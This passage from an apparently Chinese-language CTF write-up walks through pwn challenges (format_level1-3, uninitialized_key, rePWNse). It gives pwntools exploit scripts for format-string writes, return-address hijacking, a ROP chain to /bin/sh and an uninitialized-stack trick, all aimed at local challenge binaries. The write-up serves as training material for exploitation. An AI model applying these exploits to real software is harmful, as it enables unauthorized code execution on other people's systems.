<span class=\"token string\">b'\\0'</span><span class=\"token operator\">+</span> asm<span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"format_level1\"><a class=\"markdownIt-Anchor\" href=\"#format_level1\">#</a> format_level1</h2>\n<p>% x$n 的运用，x 为任意数</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'localhost'</span><span class=\"token punctuation\">,</span><span class=\"token number\">45851</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=process('./format_level1')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,'b printf')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">ready</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Your choice: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>hp <span class=\"token operator\">=</span> <span class=\"token number\">0x804C00C</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>ak <span class=\"token operator\">=</span> <span class=\"token number\">0x0804C014</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>ready<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>payload <span class=\"token operator\">=</span> p32<span class=\"token punctuation\">(</span>hp<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'%7$n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Input what you want to talk: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>ready<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>payload <span class=\"token operator\">=</span> p32<span class=\"token punctuation\">(</span>ak<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'%7$n'</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Input what you want to talk: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>ready<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"第二次\"><a class=\"markdownIt-Anchor\" href=\"#第二次\">#</a> 第二次</h1>\n<h2 id=\"uninitialized_key\"><a class=\"markdownIt-Anchor\" href=\"#uninitialized_key\">#</a> uninitialized_key</h2>\n<p>两次调用函数，name 和 key 局部变量分配的栈位置是一致的，且 key 变量未清零，所以设 name 为 114514，key 变量输入非数字符号使 scanf 无作用，便可使 key 依然保持 114514 的值。</p>\n<p><img data-src=\"./image-20230824231958630.png\" alt=\"image-20230824231958630\"></p>\n<h2 id=\"uninitialized_key_plus\"><a class=\"markdownIt-Anchor\" href=\"#uninitialized_key_plus\">#</a> uninitialized_key_plus</h2>\n<p>同理，只是这题前者函数输入的是字符串，因此利用 pwntools 工具的 p32 即可。</p>\n<p><img data-src=\"./image-20230824232448201.png\" alt=\"image-20230824232448201\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'localhost'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">42705</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p = process('./uninitialized_key_plus')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x14</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">114514</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'key:\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"repwnse\"><a class=\"markdownIt-Anchor\" href=\"#repwnse\">#</a> rePWNse</h2>\n<p>能修改 v7 到 v13 的值，满足所有 if 的条件，使得 s 为字符串’/bin/sh’，否则 s 内会存在随机字符。</p>\n<pre><code class=\"language-c++\">v10*v8==10*v11+v12;\t// a*a = 10*(a-b) + v12\nv12==v13+1;\t\t// \n//src[v8]需为/bin/sh的第三个字符'i'，所以a=9\nv8==v10;\t\t\t// a\n//src[v13]需为第5个字符'/'，v13=0\nv7==v9;\t\t\t//b\nv10-v11==v7;\t\t//v11 = a-b\n\n/* 因此\na=9 v13=0\nv12 = 1\n9*9 = 81 = 10*(9-b) + 1\nb = 1\nv7-v13应为\n1 9 1 9 8 1 0\n*/\n\n</code></pre>\n<p>随后利用栈溢出和后门函数。</p>\n<pre><code>#!/usr/bin/python3\nfrom pwn import *\ncontext(log_level='debug')\n\n#p = process('./rePWNse')\np =remote('localhost',41225)\n\np.recvuntil(b'digits:\\n')\np.sendline(b'1 9 1 9 8 1 0')\np.recvuntil(b'address is:')\n\nbinsh = int(p.recvuntil(b'\\n')[:-1].decode(),16)\nprint(hex(binsh))\nrdi_ret = 0x40168e\nexe = 0x401296\noffset = 0x40 + 8\npayload = b'a'*offset + p64(rdi_ret) + p64(binsh) + p64(exe)\n\np.send(payload)\np.sendline(b'cat flag')\nprint(p.recv())\np.interactive()\n</code></pre>\n<h2 id=\"format_level2\"><a class=\"markdownIt-Anchor\" href=\"#format_level2\">#</a> format_level2</h2>\n<p>这次 attack 函数内不再跳转后门函数，因此该函数失去价值。</p>\n<p>这时利用 hijack retaddr，修改返回地址指向攻击函数。</p>\n<p>因为输入限制 16 字节，不能做到一次性修改，所以分成 4 次，% hn 每次修改一个字节，最终修改完四字节。</p>\n<p>因为多次调用函数，所以选择修改 game 函数的返回地址，利用 printf 先泄露一个栈上地址，然后根据偏移计算出目标地址。</p>\n<p><img data-src=\"./image-20230827231550756.png\" alt=\"image-20230827231550756\"></p>\n<p>泄露 printf 函数第二个参数的内容，即指向字符串的地址，计算与 game 函数返回地址储存位置的偏移。0xffa438fc-0xffa438bc = 0x40.</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'localhost'</span><span class=\"token punctuation\">,</span><span class=\"token number\">42385</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=process('./format_level2')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,'b *0x0804974c')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">ready</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Your choice: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">fmt</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    target <span class=\"token operator\">-=</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    payload <span class=\"token operator\">=</span> p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'%'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'd%7$hn'</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">16</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Input what you want to talk: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">fmth</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    target <span class=\"token operator\">-=</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    payload <span class=\"token operator\">=</span> p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'%'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'd%7$hhn'</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">16</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Input what you want to talk: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>gadget <span class=\"token operator\">=</span> <span class=\"token number\">0x08049317</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>ready<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'%p\\n'</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Input what you want to talk: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'You said: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ret_addr <span class=\"token operator\">=</span> addr <span class=\"token operator\">+</span> <span class=\"token number\">0x40</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>P <span class=\"token operator\">=</span> p32<span class=\"token punctuation\">(</span>ret_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'%'</span> <span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>gadget<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'd%7$n'</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>ready<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>fmt<span class=\"token punctuation\">(</span>ret_addr<span class=\"token punctuation\">,</span> <span class=\"token number\">0x17</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>ready<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>fmt<span class=\"token punctuation\">(</span>ret_addr<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x93</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>ready<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>fmth<span class=\"token punctuation\">(</span>ret_addr<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x804</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>ready<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"format_level3\"><a class=\"markdownIt-Anchor\" href=\"#format_level3\">#</a> format_level3</h2>\n<p>这次字符串 str 不再位于栈中，而是作为全局变量位于 bss 段上，因此无法在字符串中写入要修改内存的地址以达到修改指定地址的目的。这时选择利用栈中已有地址进行跳板修改。</p>\n<p>ebp 地址是连锁的，所以可以利用其先修改栈上地址使其指向栈上返回地址，之后再修改栈上返回地址指向后门函数。</p>\n<p><img data-src=\"./image-20230827234348784.png\" alt=\"image-20230827234348784\"></p>\n<p>printf 第 7 个参数为 0xff894538 处的 0xff894558，%6$n 则会修改 0xff894558 处的值，将其修改为 0xff89455c。</p>\n<p>0xff894558-0xff894520 = 0x38 ，第 15 个参数位于 0xff894558, %14$n 会修改 0xff89455c 处的值，将其修改为后门函数地址。即可实现攻击。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context(os='linux', arch='amd64', log_level='debug')</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=remote('localhost',35397)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./format_level3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,'b printf')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">ready</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Your choice: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">fmt</span><span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">,</span> target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'offset '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'target '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    payload <span class=\"token operator\">=</span> <span class=\"token string\">b'%'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'd%'</span><span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'$n'</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">16</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Input what you want to talk: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">fmth</span><span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">,</span> target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'offset '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'target '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    payload <span class=\"token operator\">=</span> <span class=\"token string\">b'%'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'd%'</span><span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'$hhn'</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">16</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Input what you want to talk: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"31\"></td><td><pre>gadget <span class=\"token operator\">=</span> <span class=\"token number\">0x08049317</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">#first_offset = ( 0xffffcf68 - 0xffffcf50 ) //4</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\">#ret_addr = addr + 0xffffcf8c - 0xffffcf54</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">#second_offset = (0xffffcf8c - 0xffffcf50) //4 </span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>first_offset <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">0xff894538</span> <span class=\"token operator\">-</span><span class=\"token number\">0xff894520</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>second_offset <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0xff894558</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xff894520</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span><span class=\"token number\">4</span> </pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>ready<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'%'</span><span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>first_offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'$p\\n'</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Input what you want to talk: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'You said: 